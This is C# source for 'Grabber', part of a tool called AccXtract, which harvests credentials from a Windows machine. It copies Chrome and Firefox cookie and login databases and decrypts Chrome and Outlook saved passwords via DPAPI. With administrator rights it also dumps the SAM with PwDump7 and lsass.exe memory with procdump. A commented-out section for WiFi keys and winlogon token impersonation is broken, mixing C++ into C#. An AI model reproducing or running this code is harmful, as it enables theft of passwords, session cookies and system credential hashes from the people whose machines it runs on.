//Copyright 2013 Garrett Davidson
//
//This file is part of AccXtract
//
//    AccXtract is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    AccXtract is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with AccXtract.  If not, see <http://www.gnu.org/licenses/>.

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Data.SQLite;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Xml;
using System.Security.Principal;
using System.Diagnostics;
using Microsoft.Win32;


namespace Grabber
{
    class Program
    {
        static void Main(string[] args)
        {
            string cd = Directory.GetCurrentDirectory();
            string home = Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%");

            cd += "\\AccXtract\\" + Environment.MachineName;

            #region chrome
            try
            {
                bool chromeExists = grabChromeData(cd, home);
                if (chromeExists) decryptChromePasswords(cd, home);
                //chrome passwords can only be decrypted on local machine
            }
            
            catch { Console.WriteLine("Chrome failed"); }
            #endregion

            #region FF
            try
            {
                bool firefoxExists = grabFireFoxData(cd, home);
                //firefox passwords do not need to be decrypted
                //firefox will decrypt them for you
                //work smarter, not harder
            }

            catch { Console.WriteLine("Firefox failed"); }
            #endregion

            #region Outlook
            grabOutlookPasswords(cd, home);

            #endregion

            #region Skype Convos



            #endregion

            #region Admin Stuff
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                #region SAM
                try
                {
                    dumpSAM(cd, home);
                }

                catch { }
                #endregion

                #region
                dumpWinPasswords(cd, home);
                #endregion
            }

            #endregion
        }


        static bool grabChromeData(string cd, string home)
        {
            if (Directory.Exists(home + @"\AppData\Local\Google\Chrome"))
            {

                Directory.CreateDirectory(cd + "\\Chrome\\Default");

                //Default's cookies
                File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\Default\Cookies", cd + "\\Chrome\\Default\\cookies", true);

                //Default's encrypted login data
                File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data", cd + "\\Chrome\\Default\\Login Data", true);


                string chromePath = home + @"\AppData\Local\Google\Chrome\User Data\";

                List<string> list = new List<string>();
                System.IO.StreamReader file = new StreamReader(chromePath + @"Local State");

                int currentNumberOfProfiles = 0;
                string line;
                bool foundProfile = false;
                while ((line = file.ReadLine()) != null)
                {
                    if (line.Contains(@"""Profile "))
                    {

                        string[] values = line.Split('"');
                        list.Add(values[1]);
                        foundProfile = true;

                        currentNumberOfProfiles++;
                    }
                    else if (line.Contains(@"""name"":") && foundProfile)
                    {
                        string[] values = line.Split('"');
                        foundProfile = false;
                        list.Add(values[3]);
                    }
                }

                while (list.Count != 0)
                {
                    Directory.CreateDirectory(cd + "\\Chrome\\" + list[1]);

                    //cookies
                    try
                    {
                        File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\" + list[0] + "\\Cookies", cd + "\\Chrome\\" + list[1] + "\\Cookies", true);
                    }
                    catch { };

                    //encrypted login data
                    try
                    {
                        File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\" + list[0] + "\\Login Data", cd + "\\Chrome\\" + list[1] + "\\Login Data", true);
                    }
                    catch { };

                    list.RemoveAt(0);
                    list.RemoveAt(0);
                }

                file.Close();

                return true;
            }

            else return false;
        }

        static void decryptChromePasswords(string cd, string home)
        {
            cd += "\\Chrome";

            if (Directory.Exists(cd))
            {

                foreach (string profile in Directory.GetDirectories(cd))
                {
                    SQLiteConnection conn = new SQLiteConnection("Data Source=" + profile + "\\Login Data");

                    conn.Open();

                    SQLiteCommand retrieveData = conn.CreateCommand();
                    retrieveData.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                    SQLiteDataReader data = retrieveData.ExecuteReader();

                    List<string> decryptedData = new List<string>();
                    while (data.Read())
                    {
                        string url = (string)data["action_url"];
                        string username = (string)data["username_value"];
                        string decryptedPassword = "";

                        byte[] encryptedPassword = (byte[])data["password_value"];

                        byte[] outBytes = DPAPI.decryptBytes(encryptedPassword);

                        decryptedPassword = Encoding.Default.GetString(outBytes);

                        if (decryptedPassword != "")
                        {
                            decryptedData.Add(url);
                            decryptedData.Add(username);
                            decryptedData.Add(decryptedPassword);
                        }
                    }

                    File.WriteAllLines(profile + "\\passwords.txt", decryptedData.ToArray());

                    conn.Close();
                }
            }
        }

        static bool grabFireFoxData(string cd, string home)
        {
            string firefoxDirectory = home + @"\Appdata\Roaming\Mozilla\Firefox\Profiles";

            if (Directory.Exists(firefoxDirectory))
            {
                string[] profiles = Directory.GetDirectories(firefoxDirectory);

                foreach (string profile in profiles)
                {
                    string[] components = profile.Split('\\');
                    string profileName = components[components.Length - 1].Split('.')[1];


                    Directory.CreateDirectory(cd + "\\Firefox\\" + profileName);

                    //Cookies
                    File.Copy(profile + "\\cookies.sqlite", cd + "\\Firefox\\" + profileName + "\\cookies.sqlite", true);

                    //Passwords
                    File.Copy(profile + "\\key3.db", cd + "\\Firefox\\" + profileName + "\\key3.db", true);
                    File.Copy(profile + "\\cert8.db", cd + "\\Firefox\\" + profileName + "\\cert8.db", true);
                    File.Copy(profile + "\\signons.sqlite", cd + "\\Firefox\\" + profileName + "\\signons.sqlite", true);

                }


                return true;
            }

            else return false;
        }

        static bool grabOutlookPasswords(string cd, string home)
        {
            List<string> accounts = new List<string>();

            RegistryKey baseKey = Registry.CurrentUser;

            RegistryKey profilesKey = baseKey.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook");

            string[] profiles = profilesKey.GetSubKeyNames();

            foreach (string profile in profiles)
            {
                RegistryKey key = profilesKey.OpenSubKey(profile);

                if (key.SubKeyCount > 0)
                {
                    string[] subkeys = key.GetSubKeyNames();

                    foreach (string subkey in subkeys)
                    {
                        RegistryKey key2 = key.OpenSubKey(subkey);

                        byte[] emailBytes = (byte[])key2.GetValue("Email");

                        if (emailBytes != null)
                        {
                            string email = Encoding.Default.GetString(emailBytes);
                            email = email.Replace("\0", "");

                            accounts.Add(email);

                            string password;
                            foreach (string passKey in key2.GetValueNames())
                            {
                                if (passKey.Contains("Password"))
                                {
                                    byte[] encryptedPassword = (byte[])key2.GetValue(passKey);

                                    if (encryptedPassword[0] == 2)
                                    {
                                        List<byte> list = new List<byte>(encryptedPassword);
                                        list.RemoveAt(0);
                                        encryptedPassword = list.ToArray();
                                    }

                                    byte[] outBytes = DPAPI.decryptBytes(encryptedPassword);

                                    password = Encoding.Default.GetString(outBytes);
                                    password = password.Replace("\0", "");

                                    accounts.Add(password);
                                }
                            }
                        }
                    }
                }
            }

            if (accounts.Count > 0)
            {
                Directory.CreateDirectory(cd + "\\Outlook");

                File.WriteAllLines(cd + "\\Outlook\\accounts.txt", accounts.ToArray());

                return true;
            }

            return false;
        }

        /*static bool grabSkypeConvos(string cd, string home)
        {
            string skypeDirectory = Environment.ExpandEnvironmentVariables("%APPDATA%");
            skypeDirectory += @"\Skype";

            if (Directory.Exists(skypeDirectory))
            {
                string[] accounts = Directory.GetDirectories(skypeDirectory);

                string[] ignore = { @"Content", @"My Skype Received Files",  };

                foreach (string dir in accounts)
                {

                }

                return true;
            }

            else return false;
        }*/


        /* WiFi
        static void grabWifiPasswords(string cd)
        {
            string WiFiDirectory = Environment.ExpandEnvironmentVariables("%HOMEDRIVE%") + @"\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\";
            string outPutDirectory = cd + "\\WiFi\\";
            Directory.CreateDirectory(outPutDirectory);

            foreach (string dir in Directory.GetDirectories(WiFiDirectory))
            {
                foreach (string file in Directory.GetFiles(dir))
                {
                    string[] comps = file.Split('\\');
                    string outFile = outPutDirectory + comps[comps.Length - 1];
                    File.Copy(file, outFile, true);
                    XmlDocument doc = new XmlDocument();
                    doc.Load(outFile);

                    XmlNode protectedNode = doc["WLANProfile"]["MSM"]["security"]["sharedKey"]["protected"];
                    protectedNode.InnerText = "false";

                    XmlNode password = doc["WLANProfile"]["MSM"]["security"]["sharedKey"]["keyMaterial"];
                    byte[] encryptedBytes = stringToByteArray(password.InnerText);
                    byte[] decryptedBytes = new byte[0];
                    try
                    {
                        decryptedBytes = DPAPI.decryptBytes(encryptedBytes);
                    }

                    catch
                    {
                        Console.WriteLine("WiFi decryption failed");
                    }
                    password.InnerText = decryptedBytes.ToString();
                    Console.WriteLine(decryptedBytes.ToString());
                    doc.Save(outFile);
                }
            }
        }

        static byte[] stringToByteArray(String hex)
        {
            int numCharacters = hex.Length / 2;
            byte[] bytes = new byte[numCharacters];
            using (var sr = new StringReader(hex))
            {
                for (int i = 0; i < numCharacters; i++)
                    bytes[i] = Convert.ToByte(new string(new char[2] { (char)sr.Read(), (char)sr.Read() }), 16);
            }

            return bytes;
        }

        struct LUID
        {
            UInt32 LowPart;
            long HighPart;
        }

        enum TOKEN_INFORMATION_CLASS { 
          TokenUser                             = 1,
          TokenGroups,
          TokenPrivileges,
          TokenOwner,
          TokenPrimaryGroup,
          TokenDefaultDacl,
          TokenSource,
          TokenType,
          TokenImpersonationLevel,
          TokenStatistics,
          TokenRestrictedSids,
          TokenSessionId,
          TokenGroupsAndPrivileges,
          TokenSessionReference,
          TokenSandBoxInert,
          TokenAuditPolicy,
          TokenOrigin,
          TokenElevationType,
          TokenLinkedToken,
          TokenElevation,
          TokenHasRestrictions,
          TokenAccessInformation,
          TokenVirtualizationAllowed,
          TokenVirtualizationEnabled,
          TokenIntegrityLevel,
          TokenUIAccess,
          TokenMandatoryPolicy,
          TokenLogonSid,
          TokenIsAppContainer,
          TokenCapabilities,
          TokenAppContainerSid,
          TokenAppContainerNumber,
          TokenUserClaimAttributes,
          TokenDeviceClaimAttributes,
          TokenRestrictedUserClaimAttributes,
          TokenRestrictedDeviceClaimAttributes,
          TokenDeviceGroups,
          TokenRestrictedDeviceGroups,
          TokenSecurityAttributes,
          TokenIsRestricted,
          MaxTokenInfoClass
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            uint TokenInformationLength,
            out uint ReturnLength);


        bool SetPrivilege (string strPrivilege, IntPtr hToken, bool bEnable)
        {
            bool bReturn = false;
            LUID luid;
            GetTokenInformation
            bReturn =  LookupPrivilegeValue (NULL, strPrivilege.c_str(), &luid); // This is the val
            if (bReturn == false) return false;

            TOKEN_PRIVILEGES tp;
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

            if (AdjustTokenPrivileges (hToken, FALSE, &tp, 0, NULL, NULL) != ERROR_SUCCESS)
            {
                return false;
            }
            return true;
        } 

        bool ImpersonateToLoginUser()
        {
             IntPtr hProcess;
             HANDLE hToken;
             BOOL bSuccess;

            DWORD dwProcID = GetProcessID (L"winlogon.exe");

            if (dwProcID < 1) return false;

            hProcess = OpenProcess (MAXIMUM_ALLOWED, FALSE, dwProcID);

            if (hProcess == INVALID_HANDLE_VALUE)
                return false;
            
            bSuccess = OpenProcessToken (hProcess, MAXIMUM_ALLOWED, &hToken);
            if (bSuccess)
            {

                SetPrivilege (SE_DEBUG_NAME, hToken, true); // 
                 bSuccess = ImpersonateLoggedOnUser (hToken);
            }
    
            if (hProcess)
            CloseHandle (hProcess);
            if (hToken)
            CloseHandle (hToken);
    
            return bSuccess;
        }
        */

        static void dumpSAM(string cd, string home)
        {
            Directory.CreateDirectory(cd + "\\Windows");
            ProcessStartInfo inf = new ProcessStartInfo();
            inf.RedirectStandardOutput = true;
            inf.FileName = Directory.GetCurrentDirectory() + "\\Tools\\PwDump7\\PwDump7.exe";
            inf.UseShellExecute = false;
            Process proc = Process.Start(inf);
            StreamWriter output = new StreamWriter(cd + "\\Windows\\sam.txt");
            output.Write(proc.StandardOutput.ReadToEnd());
            output.Close();
        }

        static void dumpWinPasswords(string cd, string home)
        {
            ProcessStartInfo inf = new ProcessStartInfo();
            inf.RedirectStandardOutput = true;
            inf.FileName = Directory.GetCurrentDirectory() + "\\Tools\\procdump.exe";
            inf.UseShellExecute = false;
            inf.Arguments = @"-accepteula -ma lsass.exe " + cd + "\\Windows\\lsass.dmp";
            Process proc = Process.Start(inf);
            //StreamWriter output = new StreamWriter(cd + "\\Windows\\lsass.dmp");
            //output.Write(proc.StandardOutput.ReadToEnd());
            //output.Close();
        }
    }
}
